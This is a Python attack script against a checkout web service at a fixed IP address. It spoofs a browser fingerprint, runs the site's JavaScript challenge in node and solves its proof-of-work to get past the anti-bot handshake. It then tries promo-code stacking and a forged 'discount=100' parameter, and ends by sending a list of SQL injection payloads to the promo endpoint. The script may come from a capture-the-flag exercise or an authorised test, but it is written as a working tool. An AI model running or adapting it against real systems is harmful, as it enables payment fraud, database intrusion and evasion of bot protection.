import requests
import re
import hashlib
import json
import subprocess

base_url = "http://155.212.216.201:8080"
s = requests.Session()
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
s.headers.update({
    "User-Agent": ua,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
})

# Login
s.post(f"{base_url}/login", data={"username": "player_test42", "password": "SuperPassword123!"})

def do_handshake(sess):
    r_co = sess.get(f"{base_url}/checkout/13537")
    cid = re.search(r'meta name=["\']mk-c["\'] content=["\']([^"\']+)["\']', r_co.text).group(1)
    html_tag = re.search(r'<html\s+([^>]+)>', r_co.text).group(1)
    html_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', html_tag))
    body_tag = re.search(r'<body\s+([^>]+)>', r_co.text).group(1)
    body_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', body_tag))
    style_match = re.search(r'<style[^>]*>([\s\S]*?)</style>', r_co.text)
    css_vars = {}
    if style_match:
        for var, val in re.findall(r'(--[\w\-]+)\s*:\s*([^;]+);', style_match.group(1)):
            css_vars[var.strip()] = val.strip()
    all_attrs = dict(re.findall(r'([\w\-]+)=["\']([^"\']*)["\']', r_co.text))

    r_boot = sess.get(f"{base_url}/api/bootstrap?c={cid}").json()
    p_code = r_boot["p"]
    js_eval = f"""
    const html_attrs = {json.dumps(html_attrs)};
    const body_attrs = {json.dumps(body_attrs)};
    const css_vars = {json.dumps(css_vars)};
    const all_attrs = {json.dumps(all_attrs)};
    const document = {{
      documentElement: {{ getAttribute: (attr) => html_attrs[attr] || 0 }},
      body: {{ getAttribute: (attr) => body_attrs[attr] || 0 }},
      querySelector: (sel) => {{
        const m = sel.match(/\\[([\\w\\-]+)\\]/);
        if (m) {{
          const attr = m[1];
          if (all_attrs[attr] !== undefined) return {{ getAttribute: () => all_attrs[attr] }};
        }}
        return null;
      }}
    }};
    const getComputedStyle = () => ({{ getPropertyValue: (prop) => css_vars[prop] || '' }});
    const fn = new Function({json.dumps(p_code)});
    console.log(fn());
    """
    a_val = int(subprocess.check_output(["node", "-e", js_eval]).decode().strip())
    seed = r_boot["s"]
    diff = r_boot["d"]
    n = 0
    prefix = "0" * diff
    while True:
        h = hashlib.sha256(f"{seed}:{n}".encode()).hexdigest()
        if h.startswith(prefix):
            break
        n += 1
    sig = {
        "wd": False, "aut": [], "ua": ua, "lang": 2, "plug": 5, "chr": True, "uad": True,
        "ow": 1920, "oh": 1080, "iw": 1920, "ih": 950, "sw": 1920, "sh": 1080, "dpr": 1,
        "hc": 8, "dm": 8, "tz": "Europe/Moscow",
        "gl": "Google Inc. (NVIDIA) / ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
        "jit": 0.123456, "ev": 15, "t": 1250
    }
    hs_data = { "s": seed, "g": r_boot["g"], "n": str(n), "c": cid, "a": a_val, "f": sig }
    r_hs = sess.post(f"{base_url}/api/hs", json=hs_data).json()
    sess.get(f"{base_url}/api/w/co?e=15&t=1300")
    sess.headers.update({"X-Requested-With": "mk"})
    return r_hs.get("ok")

print("Handshake success:", do_handshake(s))

# Test promo behaviors
# 1. Apply WELCOME5
r1 = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": "WELCOME5"}).json()
print("Promo WELCOME5 (1):", r1)

# Apply WELCOME5 again
r2 = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": "WELCOME5"}).json()
print("Promo WELCOME5 (2):", r2)

# Check pay deficit
r_pay = s.post(f"{base_url}/api/v2/checkout/pay", json={"lot": 13537}).json()
print("Pay status after 2x WELCOME5:", r_pay)

# 2. Try extra parameters
r_param = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": "WELCOME5", "discount": 100}).json()
print("Promo with discount=100:", r_param)

# 3. SQLi tests
sqli_payloads = [
    "'",
    "''",
    "' OR '1'='1",
    "WELCOME5'--",
    "' UNION SELECT 1--",
    "' UNION SELECT 'TEST', 100, 1--",
    "' UNION SELECT 1, 'TEST', 100--",
    "' UNION SELECT 1, 100, 'TEST'--",
    "' UNION SELECT 1, 2, 3, 4--",
    "' UNION SELECT 1, 2, 3, 4, 5--"
]

for p in sqli_payloads:
    r = s.post(f"{base_url}/api/v2/checkout/promo", json={"code": p})
    print(f"SQLi [{p}]: status {r.status_code}, resp: {r.text}")
